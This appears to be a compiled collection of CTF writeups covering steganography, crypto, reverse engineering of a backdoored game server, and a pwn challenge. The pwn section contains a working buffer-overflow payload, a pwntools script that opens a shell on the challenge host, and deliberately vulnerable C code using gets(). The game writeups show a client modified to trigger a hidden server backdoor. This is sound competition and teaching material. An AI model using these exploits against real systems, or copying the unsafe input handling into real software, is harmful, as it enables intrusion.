<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-altairq
description: CTF writeups and security challenges by AltairQ.
---

# Writeups by AltairQ

Source repository: `/repos/AltairQ`

## Repository Index

- writeups/justCTF 2019/STEGANO_catto/Description.md
- writeups/justCTF 2019/STEGANO_catto/README.md
- writeups/hack.cert/stegano/easy volos/Readme.md
- writeups/hack.cert/stegano/ignite the seeds/Readme.md
- writeups/hack.cert/stegano/learn some basics/Readme.md
- writeups/hack.cert/re/hard tibia/Readme.md
- writeups/hack.cert/re/reverse it/Readme.md
- writeups/hack.cert/pwn/Nawias się musi zgadzać/Readme.md
- writeups/hack.cert/misc/Easy Tibia/Readme.md
- writeups/Teaser CONFidence CTF 2019/Bro do you even lift/Readme.md
- writeups/Teaser CONFidence CTF 2019/Game server/Readme.md

## Writeup Content


### File: writeups/justCTF 2019/STEGANO_catto/README.md

# catto

"Easy" stegano challenge combining LSB stego with chaotic mapping ([Arnold's cat map](https://en.wikipedia.org/wiki/Arnold%27s_cat_map)) to obfuscate the data.

## Intended solution

We are given the `catto.png` file. Quick look in stegsolve reveals some type of scrambled data embeded in the LSB of the red channel.

![stegsolve](img/stegsolve.png)

`pngcheck` points us to the key piece of information:

```
$ pngcheck catto.png
catto.png  additional data after IEND chunk
ERROR: catto.png
```
```
$ xxd catto.png | tail -n 3
0005fcb0: 0000 4945 4e44 ae42 6082 2878 2c79 292d  ..IEND.B`.(x,y)-
0005fcc0: 3e28 322a 782b 792c 782b 7929 204d 4f44  >(2*x+y,x+y) MOD
0005fcd0: 204e 0a                                   N.
```

The formula `(x,y)->(2*x+y,x+y) MOD N` describes the aforementioned cat map, which shuffles the pixels around. `N` refers to the size of the image (which was 500x500 - `N = 500`), `MOD N` means element-wise modulo of the coordinates (`(x,y) mod n = (x mod n, y mod n)`), essentially wrapping around the image.
[Applying it](private/catmap.py) to the extracted hidden data three times gradually deobfuscates the original image:

![pass1](img/pass1.png)
![pass2](img/pass2.png)
![pass3](img/pass3.png)

### Why it works

The image containing flag has been mapped 297 times, then embedded in the cat picture. For an image of this size, the cat map cancels itself out after 300 iterations, therefore applying the transformation 3 more times is equivalent to reversing it 297 times.

## Postmortem

Unfortunately, after the first two, the solves stopped coming. After a while I decided to investigate what went wrong. I couldn't find the error, therefore decided to write a different solver script from scratch, which revealed the fatal flaw. Compare the following two snippets of code, from the [original solver](private/catmap.py) and the [second one](solve/lsb_and_cat.py):

```python
im = array(Image.open(f_in))
N = im.shape[0]

x,y = numpy.meshgrid(range(N),range(N))
xmap = (2*x+y) % N
ymap = (x+y) % N
```
```python
def catmap(x,y, n):
	return ((x+y) % n, (2*x+y) % n)
```

As you can probably tell, the scripts use different coordinate systems. This is because PIL stores the image using the `yx` order, therefore the `numpy` transformation operated on a transposed image. `Image.fromarray` method actually takes this into consideration, which is why I didn't notice any anomalies. This discrepancy prevented the vast majority of teams from finding the flag, essentially turning this chall into a guessing game.

### Main takeaway:
* Don't use the same script for generating and solving challenges.






### File: writeups/Teaser CONFidence CTF 2019/Bro do you even lift/Readme.md

# Bro, do you even lift? (crypto)
## 85 pts

We've got two files, `lift.sage` and `out.txt`:

`lift.sage`:
```python
flag = int(open('flag.txt','r').read().encode("hex"),16)
ranges = int(log(flag,2))
p = next_prime(ZZ.random_element(2^15, 2^16))
k = 100
N = p^k
d = 5
P.<x> = PolynomialRing(Zmod(N), implementation='NTL')
pol = 0

for c in range(d):
    pol += ZZ.random_element(2^ranges, 2^(ranges+1))*x^c


remainder = pol(flag)
pol = pol - remainder
assert pol(flag) == 0

print(p)
print(pol)
```

`out.txt`:
```
35671 // this is our p
12172655049735206766902704703038559858384636896299329359049381021748*x^4 + 11349632906292428218038992315252727065628405382223597973250830870345*x^3 + 9188725924715231519926481580171897766710554662167067944757835186451*x^2 + 8640134917502441100824547249422817926745071806483482930174015978801*x + 170423096151399242531943631075016082117474571389010646663163733960337669863762406085472678450206495375341400002076986312777537466715254543510453341546006440265217992449199424909061809647640636052570307868161063402607743165324091856116789213643943407874991700761651741114881108492638404942954408505222152223605412516092742190317989684590782541294253512675164049148557663016927886803673382663921583479090048005883115303905133335418178354255826423404513286728
// and this the polynomial

```

So, in essence we have some polynomial whose root `mod N` is our flag. Fortunately `N = p^k`, and `p` is known. That's where [Hensel's lifting lemma](https://en.wikipedia.org/wiki/Hensel%27s_lemma) comes into play - it turns out that given a root of a polynomial `mod p^k` you can easily calculate the unique root `mod p^(k+1)`. `p = 35671`, and so we can simply calculate the `mod` of the coefficients and plug the resultin polynomial `mod p` into something like WolframAlpha and get the initial roots - `25020` or `27020`. 

I found [some Sage code](https://ask.sagemath.org/question/9860/solving-polynomial-equations-over-p-adic-fields/?answer=15332#post-id-15332) online (thanks dom!), I quickly modified it a bit [(`solve.sage:33`)](https://github.com/AltairQ/writeups/blob/master/Teaser%20CONFidence%20CTF%202019/Bro%20do%20you%20even%20lift/solve.sage) - the original code did not take the modulo of the intermediate results, so they grew rapidly, causing the computation to grind to a halt.

The solution derived from initial root `27020` is `0x70347b54683474355f35306d335f68333476795f6c316674316e397d`, which in ASCII is `p4{Th4t5_50m3_h34vy_l1ft1n9}`.



### File: writeups/Teaser CONFidence CTF 2019/Game server/Readme.md

# Game server (misc [RE really])
## 357 pts

This challenge is almost exactly the same as the "Hard Tibia" from ECSC, so make sure to [read my writeup of it](../../hack.cert/re/hard%20tibia). It's so similar that my old modified otclient still worked!

Only difference is that the server-side "authentication" has changed. It still depends on only two inputs - the character's nickname and its position. Let's see how it's done, courtesy of IDA decompiler:

```c++

__int64 __fastcall chksum(char *nick?, unsigned int *a2)
{
  __int64 result; // rax
  unsigned int v3; // [rsp+14h] [rbp-2Ch]
  unsigned int v4; // [rsp+18h] [rbp-28h]
  int v5; // [rsp+1Ch] [rbp-24h]
  unsigned int i; // [rsp+20h] [rbp-20h]
  int j; // [rsp+20h] [rbp-20h]
  int k; // [rsp+20h] [rbp-20h]

  v3 = *(_DWORD *)nick?;
  v4 = *((_DWORD *)nick? + 1);
  v5 = 0;
  for ( i = 0; i <= 47; ++i )
  {
    v5 -= 559038737;
    v3 += (v4 + v5) ^ (16 * v4 + a2[1]) ^ ((v4 >> 5) + a2[2]);
    v4 += (v3 + v5) ^ (16 * v3 + a2[3]) ^ ((v3 >> 5) + *a2);
  }
  for ( j = v4 & 0x7F; j; --j )
    v3 += v4 + j;
  for ( k = v3 & 0x7F; k; --k )
    v4 += v3 - k;
  *(_DWORD *)nick? = v3;
  result = v4;
  *((_DWORD *)nick? + 1) = v4;
  return result;
}

unsigned __int64 __fastcall Game::playerSayExtended(Game *this, unsigned int playerID)
{
  Position *playerPos?; // ST28_8
  bool someCheck; // al
  Container *PlayerBackpack; // rax
  __int64 v5; // ST50_8
  char *v6; // rsi
  Item **v7; // rax
  bool v8; // al
  const #83 *v9; // rax
  signed int i; // [rsp+1Ch] [rbp-A4h]
  Player *player; // [rsp+20h] [rbp-A0h]
  __int64 playerNick?; // [rsp+30h] [rbp-90h]
  unsigned __int64 posHash; // [rsp+38h] [rbp-88h]
  __int64 playerInventory?; // [rsp+48h] [rbp-78h]
  Item *v16; // [rsp+58h] [rbp-68h]
  char v17; // [rsp+60h] [rbp-60h]
  char v18; // [rsp+80h] [rbp-40h]
  unsigned int someConsts[4]; // [rsp+A0h] [rbp-20h]
  char sthPlayerNick[8]; // [rsp+B0h] [rbp-10h]
  unsigned __int64 stackCanary; // [rsp+B8h] [rbp-8h]

  stackCanary = __readfsqword(0x28u);
  player = (Player *)Game::getPlayerByID(this, playerID);
  if ( player )
  {
    Player::resetIdleTime(player);
    playerPos? = (Position *)(*(__int64 (__fastcall **)(Player *))(*(_QWORD *)player + 64LL))(player);
    playerNick? = (*(__int64 (__fastcall **)(Player *))(*(_QWORD *)player + 192LL))(player);
    someConsts[0] = 0xCAFEBABE;
    someConsts[1] = 0xDEDEDEDE;
    someConsts[2] = 0xCAFEBABE;
    someConsts[3] = 0xCAFEBABE;
    posHash = 1693LL * (playerPos?->y + playerPos?->x + playerPos?->z)
            - 811
            * ((unsigned __int64)(0xA19E253F72959F69LL
                                * (unsigned __int128)(unsigned __int64)(1693LL
                                                                      * (playerPos?->y + playerPos?->x + playerPos?->z)) >> 64) >> 9);
    for ( i = 0; i <= 7; ++i )
      sthPlayerNick[i] = *(_BYTE *)playerNick?[i];

    chksum(sthPlayerNick, someConsts);
    if ( posHash == *(_QWORD *)sthPlayerNick
                  - 811
                  * ((unsigned __int64)(0xA19E253F72959F69LL * (unsigned __int128)*(unsigned __int64 *)sthPlayerNick >> 64) >> 9) )
     {
      puts("no kurwa!"); // success! free gold!
     }
     {
      puts("kurwa..."); // fail, and you lose 10hp
     }
    }
}

```

Obviously I took the liberty of somewhat cleaning up the code. I deduced that it uses the player's position from the fact that it seemed to use something like `struct ... { int16_t a; int16_t b; int8_t c}`, which is exactly how the server stores a `Position` struct (as seen somewhere in the [code](https://github.com/otland/forgottenserver) ).

If you were to modify your client you'll quickly learn that the spawn point is `(95, 117, 7)`. Calculating the appropriate `posHash` value (see `brute.cpp:calc`), we can bruteforce our 8-character nickname (again, see `brute.cpp`). This time the algorithm returns a lot more possibilities. After grabbing one and creating a new account, you can test whether you pass the check - you should lose 10hp (if you're not standing exactly at the spawn point). Now all that's left is to kill a goblin (northern part of the map), then return to the spawn (just get killed) and trigger the backdoor. You should get kicked off the server, and upon logging in, you should get free GP. Every stack of GP is set to 100, so split the stack as many times as necessary. After becoming rich talk to the Flagkeeper, just like in `Hard Tibia`.

Zajebiste zadanie ;) 



### File: writeups/hack.cert/misc/Easy Tibia/Readme.md

# Easy Tibia
## Pts: 200
```
We are running a MMORPG game server, but turns out there are lots of troubles with it. Yesterday we've added a new island on the map (in the left-bottom corner). It is not reachable in any normal way, because yet there is no bridge which would allow to get there. However, we've found that some players succesfully used hacks in order to do so. Could you investigate?

The server is located there: https://game-server.ecsc18.hack.cert.pl.

Hint: In order to run game client, you either have to compile it from sources or use Vagrant. Build instructions are in README.md file of the otclient.tgz package. If you have any trouble building the client, use vagrant up --provider=virtualbox command and the required environment should be set up automatically. If using vagrant, login/password are vagrant/vagrant and everything is in the /vagrant directory.

Format flagi: ecsc{litery_cyfry_i_znaki_specjalne}.
```

After creating the account and building the client I found the island and started investigating.
It turns out, if you try and "use" a tile on the island, you can walk on water!

![walking on water](img/waterwalk.gif)

Opening the chest in the dungeon gives you the flag.

![flag](img/flag.png)



### File: writeups/hack.cert/pwn/Nawias się musi zgadzać/Readme.md

# Nawias się musi zgadzać (pwn)
## Pts: 150

```
W ramach programu Nowoczesne Państwo uruchomiliśmy w klastrze cyberbezpieczeństwa usługę pozwalającą sprawdzić czy wyrażenie jest poprawnie onawiasowane. Sprawdź czy Twoje wyrażenia są poprawnie onawiasowane, i nie próbuj się włamywać, bo i tak Ci się to nie uda!

Program jest do pobrania stąd.

nc pwning2016.p4.team 1337

Format flagi: pwn{litery_cyfry_i_znaki_specjalne}
```
Dostajemy zapakowaną binarkę `brackets`

```
$ file brackets
brackets: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1a898791e079253916e3678874d6f13bd0054743, not stripped
```

Szybkie testowe uruchomienie:
```
$ ./brackets
Enter expression to check:
((()))))))))
Missing opening bracket!
```

Jak widać zachowuje się tak, jak się spodziewaliśmy. Szybkie wrzucenie w IDA pokazuje dość prosty schemat najbardziej interesującej funkcji:

![overview](img/graph%20overview.png)

```assembly
public check_my_brackets
check_my_brackets proc near

var_80= byte ptr -80h
var_10= qword ptr -10h
var_4= dword ptr -4

push    rbp
mov     rbp, rsp
add     rsp, 0FFFFFFFFFFFFFF80h
mov     [rbp+var_4], 0
lea     rax, [rbp+var_80]
mov     rdi, rax
mov     eax, 0
call    _gets
lea     rax, [rbp+var_80]
mov     [rbp+var_10], rax
jmp     short loc_40069F
```

Natychmiastowo uwagę przykuwa użycie niebezpiecznej funkcji `gets`. Można się spodziewać że mamy doprowadzić do przepełnienia bufora i nadpisania adresu powrotu. Jeżeli chodzi o cel przekierowania wykonania, to twórcy zostawili nam miły prezent w postaci funkcji `shell_me` która spawnuje nam shella. Sprawdźmy więc adresy obecnej i docelowej funkcji.

```
$ readelf -s brackets

Symbol table '.symtab' contains 72 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
...
    48: 0000000000400638   143 FUNC    GLOBAL DEFAULT   14 check_my_brackets
...
    54: 00000000004005f6    66 FUNC    GLOBAL DEFAULT   14 shell_me

```

Widać że są dość blisko siebie a co lepsze nie posiadają bajtów zerowych we fragmencie który musimy nadpisać (little-endian!).

Chcielibyśmy już teraz nadpisać adres powrotu ale dalsza analiza pokazuje że to nie zadziała. Zwróćmy uwagę na to w jaki sposób kończy się nasza funkcja.

![exits](img/exits.png)

Tylko poprawne zakończenie (skrajnie prawy blok) algorytmu prowadzi do powrotu, w przeciwnym razie uruchamiany jest `exit` więc podmiana adresu nic nie da. Problemem jest 32-bitowa zmienna `var_4` która reprezentuje bilans nawiasów otwierających i zamykających. Żeby algorytm stwierdził że nawiasowanie jest poprawne to w szczególności na końcu musi ona wynosić 0. ~~Nie możemy po prostu wkleić bajtów zerowych w payload bo `gets` tego nie wczyta~~ (EDIT: Jednak się myliłem, `gets` bez problemu czyta bajty zerowe. W każdym razie wersja bez bajtów zerowych jest często wymagana, więc opłaca się poćwiczyć różne sposoby). Trik polega na tym że oprócz nadpisania surowej wartości bilans możemy jeszcze potem zmodyfikować podając nawiasy. Plan jest prosty - ustawmy bilans na `INT_MAX` i podajmy jeden nawias, żeby przekręcił się na 0.

Payload będzie miał następujący schemat
```
'(' + FF * ??? + F60540 + '\n'
```

Znak zmiany linii zostanie zamieniony na bajt zerowy, więc adres będzie się zgadzał.


Bufor jest pod adresem `rbp-128`, po drodze jest jeszcze stare `rbp` (8 bajtów) więc potrzebujemy paddingu na 136 bajty, po tym już jest adres powrotu. Zatem ostateczny payload wygląda następująco:
```
b'(' + b'\xFF'*135 + '\xF6\x05\x40'
```

Enter możemy sami wcisnąć.
Teraz czas przetestować na zdalnym serwerze.

```python
>>> from pwn import *
>>> conn = remote("pwning2016.p4.team", 1337)
>>> conn.send("(\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xf6\x05\x40")
>>> conn.interactive()
[*] Switching to interactive mode
Enter expression to check:
(^E@
whoami
brackets
ls
brackets  brackets.c  exploit.py  flag
cat flag
pwn{b1n4ry_expl01t1ng}
```

## BONUS 

Dump reszty plików!

`exploit.py`

```python
exploit = ''.join(["()" for i in range(62)])+"\x00\x00\x00\x00AAAAAAAA\xf6\x05\x40\x00"

from pwn import *

r = process('./brackets')
r.recvline()
r.sendline(exploit)
r.interactive()
```

`brackets.c`

```c
#include <stdlib.h>
#include <stdio.h>

#define FAIL(s) printf(s), exit(1)

void shell_me()
{
        char *filename = "/bin/sh";
        char *argv [2] = {filename, NULL};
        char *envp [1] = {NULL};
        execve(filename, argv, envp);
}

void check_my_brackets()
{
    int level = 0;
        char str[100];

        gets(str);
        for(char* s = str;*s;++s)
        {
                if(*s == '(')
                        level++;
                if(*s == ')')
                {
                        level--;
                        if(level < 0)
                                FAIL("Missing opening bracket!\n");
                }
        }

        if(level)
                FAIL("Missing closing bracket!\n");
        return;
}

int main()
{
        printf("Enter expression to check:\n");
        check_my_brackets();
        printf("Correct!\n");
        return 0;
}
```


### File: writeups/hack.cert/re/hard tibia/Readme.md

# Hard Tibia (re/misc) 400pts

```
We are running a MMORPG game server, but turns out there are lots of troubles with it. Yesterday the server was hacked and its executable was replaced with another one.
tfs_original
tfs_backdoored
The server is still running the backdoored version and is located there: https://game-server.ecsc18.hack.cert.pl

Hint: Questions related to game play may be asked on IRC channel (#ecsc18 on FreeNode). Spoiling the task is still prohibited.

Hint: In order to play, download game client source package and compile it using cmake (see README.md for instructions).

Format flagi: ecsc{litery_cyfry_i_znaki_specjalne}.
```

I accessed the server and met the Flagkeeper.

![Flagkeeper](img/flagkeeper.png)

Unfortunately we start only with three pieces of cheese. Only way to get gold is to hunt goblins in the northern part of the map, but they only drop about 3gp each. We need a way to get rich fast.

As in the description, we are provided with two files, one with the backdoor. I decided to try and diff them, but ordinary binary diffing will not work here, because the binary has been recompiled. I used `radiff2`, which is a bit more clever, as it can recognize modified functions and sort them by how much they differ.

`radiff2 -CA tfs_original tfs_backdoored` yielded (after a loooong time):

```
sym.__libc_csu_init   101 0x6367d0 |   MATCH  (0.940594) | 0x636d20    101 sym.__libc_csu_init
sym.__libc_csu_fini     2 0x636840 |   MATCH  (1.000000) | 0x636d90      2 sym.__libc_csu_fini
sym._fini     9 0x636844 |   MATCH  (1.000000) | 0x636d94      9 sym._fini
fcn.0036b5d8    15 0x36b5d8 |     NEW  (0.000000)
fcn.003b5bfc    44 0x3b5bfc |     NEW  (0.000000)
fcn.003b6658     9 0x3b6658 |     NEW  (0.000000)
fcn.003b7532     9 0x3b7532 |     NEW  (0.000000)
sym.Game::playerSayExtended  1013 0x3ffd8a |     NEW  (0.000000)
fcn.00437e12    11 0x437e12 |     NEW  (0.000000)
fcn.00465072    62 0x465072 |     NEW  (0.000000)
fcn.004660dc    43 0x4660dc |     NEW  (0.000000)
sym.ProtocolGame::parseSayExtended   175 0x5a8086 |     NEW  (0.000000)
fcn.005e3581    31 0x5e3581 |     NEW  (0.000000)
```

We have some interesting new functions, `ProtocolGame::parseSayExtended` and `Game::playerSayExtended`. Also, we have symbols so let's grab [the "forgotten server" code](https://github.com/otland/forgottenserver).

Let's load the file in IDA and see how we can access any of the new functions (which obviously smell like a backdoor to me).

It turns out that the `Game::playerSayExtended` is referenced only from `ProtocolGame::parseSayExtended`, which in turn is referenced only from `ProtocolGame::parsePacket`, which certainly sounds like an entry point for our exploits.

![parsePacket interesting case](img/case.png)

Let's open the original code for this function and try and see where the call is injected:
```cpp
void ProtocolGame::parsePacket(NetworkMessage& msg)
{
	if (!acceptPackets || g_game.getGameState() == GAME_STATE_SHUTDOWN || msg.getLength() <= 0) {
		return;
	}

	uint8_t recvbyte = msg.getByte();

  // ...

	switch (recvbyte) {
		//...
		case 0x8D: parseLookInBattleList(msg); break;
		case 0x8E: /* join aggression */ break;
		//   0x8F: parseSayExtended(msg); break;
		case 0x96: parseSay(msg); break;
    // ...
	}

  // ...
}
```

The attackers chose an unused packet type to implement the backdoor. Quick look at the `parseSayExtended` suggests some kind of auth check:

![parseSayExtended overview](img/parsesayex.png)

```asm
mov     rax, [rbp+msg]
mov     rdi, rax        ; this
call    NetworkMessage::get<uint>(void)
mov     [rbp+auth], eax
cmp     [rbp+auth], 0FFAACC71h
jnz     short loc_5A8126
mov     rax, [rbp+this]
mov     rax, [rax+78h]
mov     rdi, rax        ; this
call    Creature::getID(void)
mov     [rbp+var_50], eax
lea     rax, g_game
mov     [rbp+var_48], rax
lea     rax, Game::playerSayExtended(uint)
mov     [rbp+__f], rax
mov     [rbp+var_38], 0
lea     rax, [rbp+func]
lea     rcx, [rbp+var_50] ; unsigned int *
lea     rdx, [rbp+var_48] ; Game **
lea     rsi, [rbp+__f]  ; __f
mov     rdi, rax        ; retstr
call    std::bind<void (Game::*)(uint),Game*,uint>(void (Game::*)(uint)&&,Game*,uint&&)
lea     rax, [rbp+func]
mov     rdx, rax        ; func
mov     esi, 0          ; delay
mov     edi, 0          ; droppable
call    ProtocolGame::addGameTaskInternal<std::_Bind<void (Game::*)(uint) ()(Game*,uint)>>(bool,uint,std::_Bind<void (Game::*)(uint) ()(Game*,uint)> const&)
```

I cleaned up the code of some mangled symbols, but we can clearly see that the server checks if the packet contains `0xFFAACC71`, and only then it executes `Game::playerSayExtended(Player->getID())`. That's a nice start, let's try and send this packet to the backdoored server. I did it in the simplest way possible, by modifying the client code so that every time I send a message, it also triggers the backdoor.
Let's take a look at some code similar in function so that we can modify it...

```cpp
// client/protocolgamesend.cpp
void ProtocolGame::sendTalk(Otc::MessageMode mode, int channelId, const std::string& receiver, const std::string& message)
{
    this->TriggerBackdoor();

    if(message.empty())
        return;

    if(message.length() > 255) {
        g_logger.traceError("message too large");
        return;
    }

    OutputMessagePtr msg(new OutputMessage);
    msg->addU8(Proto::ClientTalk);
    msg->addU8(Proto::translateMessageModeToServer(mode));

    switch(mode) {
    case Otc::MessagePrivateTo:
    case Otc::MessageGamemasterPrivateTo:
    case Otc::MessageRVRAnswer:
        msg->addString(receiver);
        break;
    case Otc::MessageChannel:
    case Otc::MessageChannelHighlight:
    case Otc::MessageChannelManagement:
    case Otc::MessageGamemasterChannel:
        msg->addU16(channelId);
        break;
    default:
        break;
    }

    msg->addString(message);
    send(msg);
}
```

Turns out the Tibia protocol is really simple, we manually construct the packet from bytes - that's perfect for our needs. Let's now write our `TriggerBackdoor` function:
```cpp
// client/protocolgamesend.cpp
void ProtocolGame::TriggerBackdoor()
{
    OutputMessagePtr msg(new OutputMessage);
    msg->addU8(Proto::ClientBackdoor); // this is just a constant = 143
    msg->addU32(0xFFAACC71);
    send(msg);    
}
```

If you build the client and join the server, nothing extraordinary happens until you send a message. This causes your hp to drop by 10. We're getting closer, but not quite there.

`Game::playerSayExtended(uint32_t playerId)` contains extra checks which prevent us from profiting from the backdoor. Quick decompilation yields folowing (more-or-less readable) code:

```cpp
void __cdecl Game::playerSayExtended(Game *const this, uint32_t playerId)
{
  const Position *pos; // ST30_8
  unsigned __int8 c1; // ST1A_1
  bool v4; // al
  const Container *v5; // rax
  const ItemDeque *__for_range; // ST50_8
  std::_Deque_iterator<Item*,Item* const&,Item* const*>::reference v7; // rax
  bool v8; // al
  const Position *v9; // rcx
  unsigned int i; // [rsp+1Ch] [rbp-A4h]
  uint64_t coeff2; // [rsp+20h] [rbp-A0h]
  Player *player; // [rsp+28h] [rbp-98h]
  const std::__cxx11::string *pn; // [rsp+38h] [rbp-88h]
  uint64_t coeff1; // [rsp+40h] [rbp-80h]
  Item *backpack; // [rsp+48h] [rbp-78h]
  Item *item; // [rsp+58h] [rbp-68h]
  std::deque<Item*,std::allocator<Item*> >::const_iterator __for_begin; // [rsp+60h] [rbp-60h]
  std::deque<Item*,std::allocator<Item*> >::const_iterator __for_end; // [rsp+80h] [rbp-40h]
  unsigned __int64 v19; // [rsp+A8h] [rbp-18h]

  v19 = __readfsqword(0x28u);
  player = Game::getPlayerByID(this, playerId);
  if ( player )
  {
    Player::resetIdleTime(player);
    pos = (const Position *)(*(__int64 (__fastcall **)(Player *))(*(_QWORD *)player->gap0 + 64LL))(player);
    pn = (const std::__cxx11::string *)(*(__int64 (__fastcall **)(Player *))(*(_QWORD *)player->gap0 + 192LL))(player);
    coeff1 = 1693 * (pos->y + pos->x + (unsigned int)pos->z) % 811;
    coeff2 = 0LL;
    for ( i = 1;
          i < (unsigned __int64)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length(pn);
          i += 2 )
    {
      c1 = *(_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](pn, i - 1);
      coeff2 += c1 ^ (unsigned __int8)~*(_BYTE *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator[](
                                                   pn,
                                                   i);
    }
    if ( coeff1 == 4273 * coeff2
                 - 821 * ((unsigned __int64)(0x9FA6328395FBA275LL * (unsigned __int128)(4273 * coeff2) >> 64) >> 9) )
    {
      backpack = player->inventory[3];
      v4 = backpack && (*(unsigned __int8 (__fastcall **)(Item *))(*(_QWORD *)backpack->gap0 + 136LL))(backpack) ^ 1;
      if ( v4 && (*(__int64 (__fastcall **)(Item *))(*(_QWORD *)backpack->gap0 + 88LL))(backpack) != 0 )
      {
        v5 = (const Container *)(*(__int64 (__fastcall **)(Item *))(*(_QWORD *)backpack->gap0 + 88LL))(backpack);
        __for_range = Container::getItemList(v5);
        std::deque<Item *,std::allocator<Item *>>::begin(&__for_begin, __for_range);
        std::deque<Item *,std::allocator<Item *>>::end(&__for_end, __for_range);
        while ( std::operator!=<Item *,Item * const&,Item * const*>(&__for_begin, &__for_end) )
        {
          v7 = std::_Deque_iterator<Item *,Item * const&,Item * const*>::operator*(&__for_begin);
          item = *v7;
          v8 = (*(unsigned __int8 (__fastcall **)(Item *const , std::deque<Item*,std::allocator<Item*> >::const_iterator *))(**(_QWORD **)v7 + 136LL))(
                 *v7,
                 &__for_end) ^ 1
            && Item::isStackable(item);
          if ( v8 )
            Item::setItemCount(item, 100u);
          std::_Deque_iterator<Item *,Item * const&,Item * const*>::operator++(&__for_begin);
        }
        Player::kickPlayer(player, 1);
        v9 = (const Position *)(*(__int64 (__fastcall **)(Player *, signed __int64))(*(_QWORD *)player->gap0 + 64LL))(
                                 player,
                                 1LL);
        Game::addMagicEffect(this, v9, 3u);
      }
    }
    else
    {
      (*(void (__fastcall **)(Player *, _QWORD, signed __int64))(*(_QWORD *)player->gap0 + 544LL))(player, 0LL, 10LL);// hurt player?
      Game::addCreatureHealth(this, &player->0);
    }
  }
}
```

Unfortunately we do not have all offsets resolved, and I couldn't fix them manually. I tried running the server locally and debugging it to try and guess the method calls, but failed miserably because of library dependencies. We have some type information, which will help us. We can see that the code computes two values, one from some `Position` value, and the second from `std::string` obtained from `Player` object, and then compares them. Looking at the code my first guess is that the position is either the player current position, login position, or temple position. The string is most likely the character's nick. 

As for the code effects, either it does something with our inventory, setting some `itemCount`s to 100 and kicking us off the server, or (if we fail the check) does something with our health, which we could see previously. 

I modified the client to print current player position every time I move, and discovered the spawn position to be `(95, 117, 7)`. You can quite easily bruteforce the nick required to pass the check (see `brute.cpp`). After creating new account with the calculated nickname, I tested the exploit. My client was immediately disconnected, and the 3gp I had in the backpack turned into 100gp stack. Rinse and repeat.

![look ma i'm rich](img/dolla.png)

Only thing left is to buy the flag!

![buying](img/buy.gif)




### File: writeups/hack.cert/re/reverse it/Readme.md

# Reverse it (re)
## Pts: 50

```
Lokalny fanatyk kotów zabezpieczył swoją bazę kotów za pomocą hasła.
Jedyny sposób żeby poznać hasło uzyskać dostęp do gigabajtów kotów to złamanie jego programu.

Czy podołasz wyzwaniu?

Format flagi: pwn{litery_cyfry_i_znaki_specjalne}.
```

Po uruchomieniu `it(...).exe` widzimy obrazek z kotem i pytanie o hasło:

![splash](img/splash.png)

Naturalnie pierwsze co robimy to wrzucamy plik do IDA:

![overview](img/graph%20overview.png)
![main](img/main.png)
![loop](img/loop.png)
![cmp](img/compare.png)

Schemat jest bardzo prosty, po chwili analizy widzimy że jedyne co program robi to wczytuje od nas ciąg znaków, operuje na nim w pętli a następnie porównuje z jakimś statycznym ciągiem.

Po szybkiej ręcznej dezasemblacji (najważniejszy fragment):
```c
scanf("%50s", in_string);
slen = strlen(in_string);

int i = 0;

while(i < slen)
{
	in_string[i] = (byte)(in_string[i] ^ in_string[i+1]);
	i++;
}

if (strcmp(in_string, asc_404723) == 0)
	good_flag();
else
	bad_flag();
```

Trudno nazwać ten algorytm szyfrowaniem, jako że nie wymaga on żadnego sekretu. Każda litera xor-owana jest z jej następnikiem, można to sobie wyobrazić jako xor po literach na dwóch ciągach - oryginalnym i przesuniętym o jeden w prawo. Obserwacja jest dość prosta - ostatnia litera jest nienaruszona. Staje się ona "wytrychem", który pozwala na odszyfrowanie poprzedniej litery, a dzięki niej kolejnej i tak dalej, aż do odszyfrowania całości. Zerknijmy na zakodowaną wersję hasła:

```assembly
.rdata:00404723 asc_404723      db 7                    ; DATA XREF: _main:loc_40160B↑o
.rdata:00404724                 db  19h
.rdata:00404725                 db  15h
.rdata:00404726                 db  18h
.rdata:00404727                 db  11h
.rdata:00404728                 db  0Bh
.rdata:00404729                 db    9
.rdata:0040472A                 db    4
.rdata:0040472B                 db  1Bh
.rdata:0040472C                 db  30h ; 0
.rdata:0040472D                 db  1Eh
.rdata:0040472E                 db  0Fh
.rdata:0040472F                 db  0Ah
.rdata:00404730                 db  1Bh
.rdata:00404731                 db  2Dh ; -
.rdata:00404732                 db  17h
.rdata:00404733                 db  13h
.rdata:00404734                 db  13h
.rdata:00404735                 db  17h
.rdata:00404736                 db    1
.rdata:00404737                 db  16h
.rdata:00404738                 db  18h
.rdata:00404739                 db  7Dh ; }
.rdata:0040473A                 db    0
.rdata:0040473B                 db    0
```

IDA podpowiada że ostatni znak to '}' - czyli obserwacja się potwierdza. Ostatni krok to napisanie skryptu który odwróci kodowanie.

```python
enc = [0x7, 0x19,0x15,0x18,0x11,0x0B,0x9,0x4,0x1B,0x30,0x1E,0x0F,0x0A,0x1B,0x2D,0x17,0x13,0x13,0x17,0x1,0x16,0x18,0x7D,0x0,0x0][::-1]

res = [0]*len(enc)

for i in range(1, len(enc)):
	res[i] = res[i-1] ^ enc[i]


print("".join([chr(i) for i in res[::-1]]))
	
```

Zadanie rozwiązane!
Flaga: `pwn{crypto_AND_reverse}`.


### File: writeups/hack.cert/stegano/easy volos/Readme.md

